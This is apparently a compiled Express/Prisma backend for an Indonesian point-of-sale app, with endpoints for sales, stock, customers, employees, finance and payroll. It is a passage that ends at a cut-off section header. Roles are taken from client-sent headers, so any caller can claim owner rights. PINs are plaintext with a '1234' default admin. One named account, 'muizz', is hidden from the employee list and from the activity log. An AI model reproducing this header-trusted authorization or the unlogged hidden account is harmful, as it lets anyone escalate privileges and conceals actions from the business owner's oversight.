"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
require("dotenv/config");
const express_1 = __importDefault(require("express"));
const cors_1 = __importDefault(require("cors"));
const client_1 = require("@prisma/client");
const prisma = new client_1.PrismaClient();
const app = (0, express_1.default)();
const port = process.env.PORT || 3001;
/** Helper: Catat Log Aktivitas Karyawan ke Database */
const logActivity = (employeeId, action, description) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const empId = Number(employeeId);
        if (!empId || isNaN(empId))
            return;
        // Skip logging if employee name is "muizz"
        const emp = yield prisma.employee.findUnique({
            where: { id: empId },
            select: { name: true }
        });
        if (emp && emp.name.toLowerCase() === 'muizz') {
            return;
        }
        yield prisma.activityLog.create({
            data: {
                action,
                description,
                employeeId: empId
            }
        });
    }
    catch (error) {
        console.error('Failed to write activity log:', error);
    }
});
app.use((0, cors_1.default)());
app.use(express_1.default.json());
// ─────────────────────────────────────────────────────────────
// Role hierarchy helpers
// ─────────────────────────────────────────────────────────────
// CASHIER is an alias for KASIR (legacy role name support)
const ROLE_HIERARCHY = {
    KASIR: 1, CASHIER: 1, // CASHIER = alias lama dari KASIR
    ADMIN: 2,
    OWNER: 3
};
const hasRole = (userRole, required) => {
    if (!userRole)
        return false;
    return (ROLE_HIERARCHY[userRole] || 0) >= (ROLE_HIERARCHY[required] || 99);
};
/** Middleware: pastikan minimal role ADMIN */
const requireAdmin = (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    const role = req.headers['x-employee-role'];
    const employeeId = req.headers['x-employee-id'];
    if (!employeeId) {
        return res.status(403).json({ error: 'Akses ditolak. ID karyawan diperlukan.' });
    }
    // Jika akun demo (id=0)
    if (employeeId === '0') {
        if (req.method !== 'GET') {
            return res.status(403).json({ error: 'Demo mode tidak mengizinkan operasi ini' });
        }
        return next();
    }
    if (!hasRole(role, 'ADMIN')) {
        return res.status(403).json({ error: 'Akses ditolak. Minimal role ADMIN diperlukan.' });
    }
    next();
});
/** Middleware: pastikan minimal role OWNER */
const requireOwner = (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    const role = req.headers['x-employee-role'];
    const employeeId = req.headers['x-employee-id'];
    if (!employeeId) {
        return res.status(403).json({ error: 'Akses ditolak. ID karyawan diperlukan.' });
    }
    // Jika akun demo (id=0)
    if (employeeId === '0') {
        if (req.method !== 'GET') {
            return res.status(403).json({ error: 'Demo mode tidak mengizinkan operasi ini' });
        }
        return next();
    }
    if (!hasRole(role, 'OWNER')) {
        return res.status(403).json({ error: 'Akses ditolak. Hanya OWNER yang dapat melakukan ini.' });
    }
    next();
});
/** Middleware: blokir akun demo (id=0) atau tanpa ID dari semua operasi tulis */
const requireNotDemo = (req, res, next) => {
    const employeeId = req.headers['x-employee-id'];
    if (!employeeId || employeeId === '0') {
        return res.status(403).json({ error: 'Akun demo tidak dapat menyimpan data. Upgrade untuk menggunakan fitur penuh.' });
    }
    next();
};
/** Middleware: blokir akses karyawan tertentu dari fitur rental (Hanafi, Fed, Fahri) */
const checkExcludedEmployee = (req, res, next) => __awaiter(void 0, void 0, void 0, function* () {
    const employeeId = req.headers['x-employee-id'];
    if (employeeId && employeeId !== '0') {
        try {
            const emp = yield prisma.employee.findUnique({ where: { id: Number(employeeId) } });
            if (emp && ['hanafi', 'fed', 'fahri'].includes(emp.name.toLowerCase())) {
                return res.status(403).json({ error: 'Akses ditolak. Fitur rental tidak aktif untuk akun Anda.' });
            }
        }
        catch (e) {
            console.error('Error checking excluded employee:', e);
        }
    }
    next();
});
// ─────────────────────────────────────────────────────────────
// Basic sanity check
// ─────────────────────────────────────────────────────────────
app.get('/', (req, res) => {
    res.send('POSBah API is running');
});
// ─────────────────────────────────────────────────────────────
// Auth - Login with name + PIN
// ─────────────────────────────────────────────────────────────
app.post('/api/auth/login', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, pin } = req.body;
        if (!name || !pin)
            return res.status(400).json({ error: 'Nama dan PIN wajib diisi' });
        const employee = yield prisma.employee.findFirst({
            where: { name: { equals: name, mode: 'insensitive' }, pin }
        });
        if (!employee)
            return res.status(401).json({ error: 'Nama atau PIN salah' });
        res.json({ id: employee.id, name: employee.name, role: employee.role });
    }
    catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Login gagal' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Queue endpoints — Bisa diakses KASIR (semua role)
// ─────────────────────────────────────────────────────────────
// Antrian aktif (PENDING + ada queueNumber) — untuk cek slot yang terpakai
app.get('/api/queues/active', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const queues = yield prisma.transaction.findMany({
            where: { status: 'PENDING', queueNumber: { not: null } },
            select: { id: true, queueNumber: true, customerName: true, total: true }
        });
        res.json(queues);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch active queues' });
    }
}));
// Semua transaksi PENDING — untuk tampil di modal Daftar Antrian
app.get('/api/queues/pending', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const queues = yield prisma.transaction.findMany({
            where: { status: 'PENDING' },
            include: { items: { include: { product: true } }, customer: true },
            orderBy: { date: 'asc' }
        });
        res.json(queues);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch pending queues' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Products  (READ: semua | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/products', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const products = yield prisma.product.findMany();
    res.json(products);
}));
// Lookup produk by barcode (untuk scanner kasir)
app.get('/api/products/barcode/:code', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const product = yield prisma.product.findFirst({
            where: { barcode: req.params.code }
        });
        if (!product)
            return res.status(404).json({ error: 'Produk tidak ditemukan' });
        res.json(product);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal mencari produk' });
    }
}));
app.post('/api/products', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, price, costPrice, stock, unit, barcode, wholesaleEnabled, wholesalePrices, variants, image } = req.body;
        const product = yield prisma.product.create({
            data: Object.assign({ name, price: Number(price), costPrice: Number(costPrice || 0), stock: Number(stock), unit: unit || 'pcs', wholesaleEnabled: Boolean(wholesaleEnabled), wholesalePrices: wholesalePrices ? JSON.stringify(wholesalePrices) : null, variants: variants && variants.length > 0 ? JSON.stringify(variants) : null, image }, (barcode ? { barcode } : {}))
        });
        logActivity(req.headers['x-employee-id'], 'CREATE_PRODUCT', `Membuat produk baru ${product.name} (Stok: ${product.stock} ${product.unit}, Harga: Rp ${product.price.toLocaleString('id-ID')})`);
        res.json(product);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Failed to create product' });
    }
}));
app.put('/api/products/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { name, price, costPrice, stock, unit, barcode, wholesaleEnabled, wholesalePrices, variants, image } = req.body;
        const product = yield prisma.product.update({
            where: { id: Number(id) },
            data: Object.assign({ name, price: Number(price), costPrice: Number(costPrice || 0), stock: Number(stock), unit: unit || 'pcs', wholesaleEnabled: Boolean(wholesaleEnabled), wholesalePrices: wholesalePrices ? JSON.stringify(wholesalePrices) : null, variants: variants && variants.length > 0 ? JSON.stringify(variants) : null, image }, (barcode !== undefined ? { barcode: barcode || null } : {}))
        });
        logActivity(req.headers['x-employee-id'], 'UPDATE_PRODUCT', `Mengubah data produk ${product.name} (Stok: ${product.stock} ${product.unit}, Harga: Rp ${product.price.toLocaleString('id-ID')})`);
        res.json(product);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to update product' });
    }
}));
app.delete('/api/products/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const productId = Number(id);
        // Cek apakah produk masih dipakai di transaksi
        const usedInTransaction = yield prisma.transactionItem.findFirst({
            where: { productId }
        });
        if (usedInTransaction) {
            return res.status(400).json({
                error: 'Produk tidak dapat dihapus karena sudah pernah digunakan dalam transaksi. Anda bisa mengubah nama atau stoknya menjadi 0.'
            });
        }
        const product = yield prisma.product.findUnique({ where: { id: productId } });
        yield prisma.product.delete({ where: { id: productId } });
        logActivity(req.headers['x-employee-id'], 'DELETE_PRODUCT', `Menghapus produk: ${(product === null || product === void 0 ? void 0 : product.name) || productId}`);
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal menghapus produk.' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Transactions  (CREATE: semua | READ detail: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/transactions', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const transactions = yield prisma.transaction.findMany({
            include: {
                employee: true,
                customer: true,
                items: { include: { product: true } }
            },
            orderBy: { date: 'desc' }
        });
        res.json(transactions);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Failed to fetch transactions' });
    }
}));
app.post('/api/transactions', requireNotDemo, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { items, total, subtotal, discount, discountType, discountInput, discountAmt, paymentMethod, amountPaid, change, type, customerId, date, status, notes, customerName, queueNumber } = req.body;
        const employeeIdHeader = req.headers['x-employee-id'];
        let employeeId;
        if (employeeIdHeader && employeeIdHeader !== '0') {
            employeeId = Number(employeeIdHeader);
        }
        else {
            let employee = yield prisma.employee.findFirst();
            if (!employee) {
                employee = yield prisma.employee.create({
                    data: { name: 'Admin Default', role: 'ADMIN', pin: '1234' }
                });
            }
            employeeId = employee.id;
        }
        // Hitung subtotal dari items jika tidak dikirim
        const computedSubtotal = subtotal !== null && subtotal !== void 0 ? subtotal : items.reduce((sum, i) => sum + (i.price * i.quantity), 0);
        const computedDiscountAmt = discountAmt !== null && discountAmt !== void 0 ? discountAmt : Number(discount || 0);
        const computedTotal = total !== null && total !== void 0 ? total : (computedSubtotal - computedDiscountAmt);
        const transaction = yield prisma.$transaction((tx) => __awaiter(void 0, void 0, void 0, function* () {
            // 1. Buat transaksi
            const createdTx = yield tx.transaction.create({
                data: {
                    receiptNumber: `INV-${Date.now()}`,
                    total: Number(computedTotal),
                    subtotal: Number(computedSubtotal),
                    discount: Number(computedDiscountAmt), // legacy compat
                    discountType: discountType || null,
                    discountInput: Number(discountInput || 0),
                    discountAmt: Number(computedDiscountAmt),
                    amountPaid: amountPaid ? Number(amountPaid) : null,
                    change: change ? Number(change) : null,
                    paymentMethod: paymentMethod || 'PENDING',
                    status: status || 'COMPLETED',
                    notes: notes || null,
                    customerName: customerName || null,
                    queueNumber: queueNumber ? Number(queueNumber) : null,
                    type: type || 'SALES',
                    date: date ? new Date(date) : new Date(),
                    employeeId,
                    customerId: customerId || null,
                    items: {
                        create: items.map((item) => ({
                            productId: item.productId,
                            quantity: item.quantity,
                            price: item.price,
                            costPrice: item.costPrice || 0,
                            discount: item.discount || 0,
                            variantId: item.variantId || null,
                            variantName: item.variantName || null,
                            note: item.note || null,
                        }))
                    }
                },
                include: { items: { include: { product: true } } }
            });
            // 2. Kurangi stok produk
            for (const item of items) {
                yield tx.product.update({
                    where: { id: item.productId },
                    data: { stock: { decrement: item.quantity } }
                });
            }
            return createdTx;
        }));
        logActivity(employeeId, 'CREATE_TRANSACTION', `Membuat transaksi baru ${transaction.receiptNumber} senilai Rp ${Number(transaction.total).toLocaleString('id-ID')}`);
        res.json(transaction);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Failed to process transaction' });
    }
}));
app.put('/api/transactions/:id', requireNotDemo, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { paymentMethod, status, queueNumber } = req.body;
        const transaction = yield prisma.$transaction((tx) => __awaiter(void 0, void 0, void 0, function* () {
            const currentTx = yield tx.transaction.findUnique({
                where: { id: Number(id) },
                include: { items: true }
            });
            if (!currentTx) {
                throw new Error('Transaction not found');
            }
            const updateData = {};
            if (paymentMethod !== undefined)
                updateData.paymentMethod = paymentMethod;
            if (status !== undefined)
                updateData.status = status;
            if (queueNumber !== undefined)
                updateData.queueNumber = queueNumber;
            // Jika status berubah menjadi CANCELLED dan status sebelumnya bukan CANCELLED, kembalikan stok
            if (status === 'CANCELLED' && currentTx.status !== 'CANCELLED') {
                for (const item of currentTx.items) {
                    yield tx.product.update({
                        where: { id: item.productId },
                        data: { stock: { increment: item.quantity } }
                    }).catch(() => { });
                }
            }
            const updatedTx = yield tx.transaction.update({
                where: { id: Number(id) },
                data: updateData
            });
            return updatedTx;
        }));
        const employeeIdHeader = req.headers['x-employee-id'];
        logActivity(employeeIdHeader, 'UPDATE_TRANSACTION', `Mengubah transaksi ${transaction.receiptNumber} (Status: ${status || transaction.status}, Metode: ${paymentMethod || transaction.paymentMethod})`);
        res.json(transaction);
    }
    catch (error) {
        console.error(error);
        if (error.message === 'Transaction not found') {
            res.status(404).json({ error: error.message });
        }
        else {
            res.status(400).json({ error: 'Failed to update transaction' });
        }
    }
}));
// ─────────────────────────────────────────────────────────────
// Customers  (READ: ADMIN+ | WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
// Kasir perlu lookup pelanggan saat checkout — endpoint terpisah (read-only, publik)
// HARUS di atas /api/customers agar tidak ter-override
app.get('/api/customers/list', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const customers = yield prisma.customer.findMany({
            select: { id: true, name: true, phone: true },
            orderBy: { name: 'asc' }
        });
        res.json(customers);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch customers' });
    }
}));
app.get('/api/customers', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const customers = yield prisma.customer.findMany({ orderBy: { name: 'asc' } });
        res.json(customers);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch customers' });
    }
}));
app.post('/api/customers', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, phone, address } = req.body;
        const customer = yield prisma.customer.create({ data: { name, phone, address } });
        res.json(customer);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to create customer' });
    }
}));
app.put('/api/customers/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { name, phone, address } = req.body;
        const customer = yield prisma.customer.update({
            where: { id: Number(id) },
            data: { name, phone, address }
        });
        res.json(customer);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to update customer' });
    }
}));
app.delete('/api/customers/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const numId = Number(id);
        // Cek apakah pelanggan masih punya transaksi
        const txCount = yield prisma.transaction.count({ where: { customerId: numId } });
        if (txCount > 0) {
            return res.status(400).json({
                error: `Tidak dapat menghapus pelanggan ini karena masih memiliki ${txCount} transaksi. Hapus transaksi terkait terlebih dahulu.`
            });
        }
        // Cek apakah pelanggan masih punya data keuangan (piutang/hutang)
        const finCount = yield prisma.finance.count({ where: { customerId: numId } });
        if (finCount > 0) {
            return res.status(400).json({
                error: `Tidak dapat menghapus pelanggan ini karena masih memiliki ${finCount} catatan keuangan. Hapus catatan keuangan terkait terlebih dahulu.`
            });
        }
        yield prisma.customer.delete({ where: { id: numId } });
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal menghapus pelanggan.' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Employees  (READ: ADMIN+ | WRITE: OWNER only)
// ─────────────────────────────────────────────────────────────
app.get('/api/employees', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const employees = yield prisma.employee.findMany({
            where: {
                name: {
                    not: 'muizz',
                    mode: 'insensitive'
                }
            },
            orderBy: { name: 'asc' }
        });
        res.json(employees);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch employees' });
    }
}));
app.post('/api/employees', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const employeeIdHeader = req.headers['x-employee-id'];
        // Blokir demo user (id = 0)
        if (Number(employeeIdHeader) === 0) {
            return res.status(403).json({ error: 'Akun demo tidak dapat menambah karyawan' });
        }
        const count = yield prisma.employee.count();
        if (count >= 10) {
            return res.status(400).json({ error: 'Maksimal 10 karyawan telah tercapai' });
        }
        const { name, role, pin, salary } = req.body;
        // OWNER bisa tambah OWNER/ADMIN/KASIR; ADMIN hanya bisa tambah KASIR
        const requesterRole = req.headers['x-employee-role'];
        if (requesterRole !== 'OWNER' && role === 'OWNER') {
            return res.status(403).json({ error: 'Hanya OWNER yang dapat membuat akun OWNER' });
        }
        const employee = yield prisma.employee.create({ data: { name, role: role || 'KASIR', pin, salary: Number(salary || 0) } });
        logActivity(req.headers['x-employee-id'], 'CREATE_EMPLOYEE', `Menambahkan karyawan baru ${employee.name} (Role: ${employee.role})`);
        res.json(employee);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to create employee' });
    }
}));
app.put('/api/employees/:id', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const employeeIdHeader = req.headers['x-employee-id'];
        // Blokir demo user (id = 0)
        if (Number(employeeIdHeader) === 0) {
            return res.status(403).json({ error: 'Akun demo tidak dapat mengubah karyawan' });
        }
        const { name, role, pin, salary } = req.body;
        const requesterRole = req.headers['x-employee-role'];
        if (requesterRole !== 'OWNER' && role === 'OWNER') {
            return res.status(403).json({ error: 'Hanya OWNER yang dapat mengubah role menjadi OWNER' });
        }
        const employee = yield prisma.employee.update({
            where: { id: Number(id) },
            data: Object.assign({ name, role, pin }, (salary !== undefined ? { salary: Number(salary) } : {}))
        });
        logActivity(req.headers['x-employee-id'], 'UPDATE_EMPLOYEE', `Mengubah data karyawan ${employee.name} (Role: ${employee.role})`);
        res.json(employee);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to update employee' });
    }
}));
app.delete('/api/employees/:id', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const employeeIdHeader = req.headers['x-employee-id'];
        // Blokir demo user (id = 0)
        if (Number(employeeIdHeader) === 0) {
            return res.status(403).json({ error: 'Akun demo tidak dapat menghapus karyawan' });
        }
        if (Number(id) === Number(employeeIdHeader)) {
            return res.status(400).json({ error: 'Tidak dapat menghapus akun sendiri' });
        }
        // Cek apakah karyawan masih punya transaksi
        const txCount = yield prisma.transaction.count({ where: { employeeId: Number(id) } });
        if (txCount > 0) {
            return res.status(400).json({
                error: `Tidak dapat menghapus karyawan ini karena masih memiliki ${txCount} transaksi tercatat. Pertimbangkan untuk mengubah role menjadi KASIR saja.`
            });
        }
        const emp = yield prisma.employee.findUnique({ where: { id: Number(id) } });
        yield prisma.employee.delete({ where: { id: Number(id) } });
        logActivity(req.headers['x-employee-id'], 'DELETE_EMPLOYEE', `Menghapus karyawan: ${(emp === null || emp === void 0 ? void 0 : emp.name) || id}`);
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal menghapus karyawan.' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Activity Logs
// ─────────────────────────────────────────────────────────────
app.get('/api/activity-logs', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const logs = yield prisma.activityLog.findMany({
            include: {
                employee: {
                    select: {
                        id: true,
                        name: true,
                        role: true
                    }
                }
            },
            orderBy: {
                createdAt: 'desc'
            },
            take: 200
        });
        res.json(logs);
    }
    catch (error) {
        res.status(500).json({ error: 'Gagal mengambil log aktivitas' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Finance  (READ/WRITE: ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/finances', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const finances = yield prisma.finance.findMany({
            include: { customer: true },
            orderBy: { date: 'desc' }
        });
        res.json(finances);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to fetch finances' });
    }
}));
app.post('/api/finances', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { type, amount, description, date, status, customerId } = req.body;
        const finance = yield prisma.finance.create({
            data: {
                type,
                amount: Number(amount),
                description,
                date: date ? new Date(date) : new Date(),
                status: status || 'PENDING',
                customerId: customerId ? Number(customerId) : null,
            }
        });
        logActivity(req.headers['x-employee-id'], 'CREATE_FINANCE', `Membuat catatan keuangan ${finance.type} senilai Rp ${finance.amount.toLocaleString('id-ID')} (${finance.description})`);
        res.json(finance);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to create finance record' });
    }
}));
app.put('/api/finances/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { type, amount, description, date, status, customerId } = req.body;
        if (Number(amount) <= 0) {
            return res.status(400).json({ error: 'Nominal harus lebih dari 0' });
        }
        const finance = yield prisma.finance.update({
            where: { id: Number(id) },
            data: {
                type, amount: Number(amount), description,
                date: date ? new Date(date) : undefined,
                status, customerId: customerId ? Number(customerId) : null,
            },
            include: { customer: true },
        });
        logActivity(req.headers['x-employee-id'], 'UPDATE_FINANCE', `Mengubah catatan keuangan ID ${finance.id} (${finance.type}) menjadi Rp ${finance.amount.toLocaleString('id-ID')} (Status: ${finance.status})`);
        res.json(finance);
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to update finance record' });
    }
}));
app.delete('/api/finances/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a;
    try {
        const { id } = req.params;
        const numId = Number(id);
        // Ambil data sebelum dihapus untuk cek apakah hutang dari PO
        const fin = yield prisma.finance.findUnique({ where: { id: numId } });
        if (!fin)
            return res.status(404).json({ error: 'Data tidak ditemukan' });
        // Jika hutang dari PO — kembalikan status PO ke ORDERED agar bisa di-manage ulang
        if (fin.type === 'PAYABLE' && ((_a = fin.description) === null || _a === void 0 ? void 0 : _a.startsWith('Hutang PO #'))) {
            const match = fin.description.match(/Hutang PO #(\d+)/);
            if (match) {
                const poId = Number(match[1]);
                yield prisma.purchaseOrder.updateMany({
                    where: { id: poId, status: 'RECEIVED' },
                    data: { status: 'ORDERED' },
                }).catch(() => { }); // silent: PO mungkin sudah dihapus
            }
        }
        // Jika piutang/hutang memiliki deskripsi yang mengandung nomor transaksi INV-xxx
        if (fin.description) {
            const match = fin.description.match(/INV-\d+/);
            if (match) {
                const receiptNumber = match[0];
                const tx = yield prisma.transaction.findUnique({
                    where: { receiptNumber }
                });
                if (tx) {
                    // Kembalikan stok produk
                    const txItems = yield prisma.transactionItem.findMany({
                        where: { transactionId: tx.id }
                    });
                    for (const item of txItems) {
                        yield prisma.product.update({
                            where: { id: item.productId },
                            data: { stock: { increment: item.quantity } }
                        }).catch(() => { });
                    }
                    // Hapus item transaksi
                    yield prisma.transactionItem.deleteMany({
                        where: { transactionId: tx.id }
                    });
                    // Hapus transaksi
                    yield prisma.transaction.delete({
                        where: { id: tx.id }
                    });
                    logActivity(req.headers['x-employee-id'], 'DELETE_TRANSACTION', `Menghapus transaksi ${receiptNumber} secara otomatis karena catatan keuangan terkait dihapus`);
                }
            }
        }
        yield prisma.finance.delete({ where: { id: numId } });
        logActivity(req.headers['x-employee-id'], 'DELETE_FINANCE', `Menghapus catatan keuangan ${fin.type} senilai Rp ${fin.amount.toLocaleString('id-ID')} (${fin.description})`);
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Failed to delete finance record' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Reports  (ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/reports', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { from, to } = req.query;
        const salesWhere = { type: 'SALES', status: { not: 'CANCELLED' } };
        const expenseWhere = { type: 'EXPENSE' };
        const receivableWhere = { type: 'RECEIVABLE', status: 'PENDING' };
        const payableWhere = { type: 'PAYABLE', status: 'PENDING' };
        if (from || to) {
            const dateFilter = {};
            if (from)
                dateFilter.gte = new Date(from);
            if (to) {
                const toDate = new Date(to);
                toDate.setHours(23, 59, 59, 999);
                dateFilter.lte = toDate;
            }
            salesWhere.date = dateFilter;
            expenseWhere.date = dateFilter;
            receivableWhere.date = dateFilter;
            payableWhere.date = dateFilter;
        }
        const totalSales = yield prisma.transaction.aggregate({
            where: salesWhere,
            _sum: { total: true }
        });
        // Hitung total penjualan hari ini (zona waktu GMT+7 Jakarta)
        const tzOffset = 7 * 60 * 60 * 1000;
        const localNow = new Date(Date.now() + tzOffset);
        const startOfToday = new Date(Date.UTC(localNow.getUTCFullYear(), localNow.getUTCMonth(), localNow.getUTCDate(), 0, 0, 0, 0) - tzOffset);
        const endOfToday = new Date(Date.UTC(localNow.getUTCFullYear(), localNow.getUTCMonth(), localNow.getUTCDate(), 23, 59, 59, 999) - tzOffset);
        const todaySales = yield prisma.transaction.aggregate({
            where: {
                type: 'SALES',
                status: { not: 'CANCELLED' },
                date: { gte: startOfToday, lte: endOfToday }
            },
            _sum: { total: true }
        });
        const expenses = yield prisma.finance.aggregate({
            where: expenseWhere,
            _sum: { amount: true }
        });
        const receivables = yield prisma.finance.aggregate({
            where: receivableWhere,
            _sum: { amount: true }
        });
        const payables = yield prisma.finance.aggregate({
            where: payableWhere,
            _sum: { amount: true }
        });
        res.json({
            totalSales: totalSales._sum.total || 0,
            todaySales: todaySales._sum.total || 0,
            totalExpenses: expenses._sum.amount || 0,
            pendingReceivables: receivables._sum.amount || 0,
            pendingPayables: payables._sum.amount || 0,
            netIncome: (totalSales._sum.total || 0) - (expenses._sum.amount || 0)
        });
    }
    catch (error) {
        console.error('Error generating report:', error);
        res.status(400).json({ error: 'Failed to generate report' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Payroll  (OWNER only)
// Terintegrasi ke Finance sebagai tipe EXPENSE dengan prefix [Gaji]
// ─────────────────────────────────────────────────────────────
/** Ambil riwayat penggajian bulan tertentu */
app.get('/api/payroll/history', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { month, year } = req.query;
        const m = Number(month) || new Date().getMonth() + 1;
        const y = Number(year) || new Date().getFullYear();
        const start = new Date(y, m - 1, 1);
        const end = new Date(y, m, 1);
        const records = yield prisma.finance.findMany({
            where: {
                description: { startsWith: '[Gaji]' },
                date: { gte: start, lt: end }
            },
            orderBy: { date: 'desc' }
        });
        res.json(records);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal mengambil riwayat gaji' });
    }
}));
/** Bayar gaji satu karyawan → buat Finance EXPENSE */
app.post('/api/payroll/pay', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const employeeIdHeader = req.headers['x-employee-id'];
        if (Number(employeeIdHeader) === 0) {
            return res.status(403).json({ error: 'Akun demo tidak dapat membayar gaji' });
        }
        const { employeeId, month, year, amount, note } = req.body;
        const m = Number(month) || new Date().getMonth() + 1;
        const y = Number(year) || new Date().getFullYear();
        // Ambil data karyawan
        const emp = yield prisma.employee.findUnique({ where: { id: Number(employeeId) } });
        if (!emp)
            return res.status(404).json({ error: 'Karyawan tidak ditemukan' });
        // Cek sudah dibayar bulan ini?
        const start = new Date(y, m - 1, 1);
        const end = new Date(y, m, 1);
        const prefix = `[Gaji] ID:${emp.id} -`;
        const existing = yield prisma.finance.findFirst({
            where: { description: { startsWith: prefix }, date: { gte: start, lt: end } }
        });
        if (existing) {
            return res.status(400).json({ error: `Gaji ${emp.name} sudah dibayarkan untuk bulan ini.` });
        }
        const payAmount = Number(amount) || emp.salary;
        if (payAmount <= 0) {
            return res.status(400).json({ error: 'Nominal gaji harus lebih dari 0. Set gaji pokok karyawan terlebih dahulu.' });
        }
        const monthNames = ['Jan', 'Feb', 'Mar', 'Apr', 'Mei', 'Jun', 'Jul', 'Agu', 'Sep', 'Okt', 'Nov', 'Des'];
        const record = yield prisma.finance.create({
            data: {
                type: 'EXPENSE',
                amount: payAmount,
                description: `[Gaji] ID:${emp.id} - ${emp.name} (${monthNames[m - 1]} ${y})${note ? ' · ' + note : ''}`,
                date: new Date(),
                status: 'PAID',
            }
        });
        logActivity(employeeIdHeader, 'PAY_SALARY', `Membayar gaji karyawan ${emp.name} (${monthNames[m - 1]} ${y}) sebesar Rp ${payAmount.toLocaleString('id-ID')}`);
        res.json(record);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Gagal memproses pembayaran gaji' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Seed  (OWNER only)
// ─────────────────────────────────────────────────────────────
app.post('/api/seed', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const admin = yield prisma.employee.create({
            data: { name: 'Admin', role: 'ADMIN', pin: '1234' }
        });
        const product = yield prisma.product.create({
            data: { name: 'Kopi Susu', price: 20000, stock: 100 }
        });
        res.json({ message: 'Seeded successfully', admin, product });
    }
    catch (error) {
        res.status(500).json({ error: 'Already seeded or error occurred' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Reset Keuangan & Laporan  (OWNER only)
